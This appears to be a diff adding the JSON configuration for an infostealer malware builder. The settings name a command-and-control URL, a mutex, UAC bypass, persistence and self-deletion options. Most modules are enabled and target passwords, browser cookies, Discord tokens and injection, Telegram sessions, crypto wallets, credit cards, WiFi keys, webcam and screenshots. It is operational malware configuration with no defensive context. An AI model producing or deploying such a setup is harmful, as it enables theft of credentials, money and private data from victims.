@@ -1,0 +1,46 @@
+{
+    "settings":  {
+                     "c2":  [
+                                0,
+                                "http://127.0.0.1:5000"
+                            ],
+                     "mutex":  "d28b319abe254dbdb217055c60b45db0",
+                     "pingme":  true,
+                     "vmprotect":  false,
+                     "startup":  false,
+                     "melt":  false,
+                     "uacBypass":  false,
+                     "archivePassword":  "phantom",
+                     "consoleMode":  1,
+                     "debug":  false,
+                     "pumpedStubSize":  0,
+                     "boundFileRunOnStartup":  false
+                 },
+    "modules":  {
+                    "captureWebcam":  true,
+                    "capturePasswords":  true,
+                    "captureCookies":  true,
+                    "captureHistory":  true,
+                    "captureAutofills":  true,
+                    "captureDiscordTokens":  true,
+                    "captureGames":  true,
+                    "captureWifiPasswords":  true,
+                    "captureSystemInfo":  true,
+                    "captureScreenshot":  true,
+                    "captureTelegramSession":  true,
+                    "captureCommonFiles":  true,
+                    "captureWallets":  true,
+                    "captureExif":  true,
+                    "captureCreditCards":  true,
+                    "fakeError":  [
+                                      false,
+                                      [
+                                          "Error",
+                                          "An error occurred.",
+                                          0
+                                      ]
+                                  ],
+                    "blockAvSites":  false,
+                    "discordInjection":  true
+                }
+}
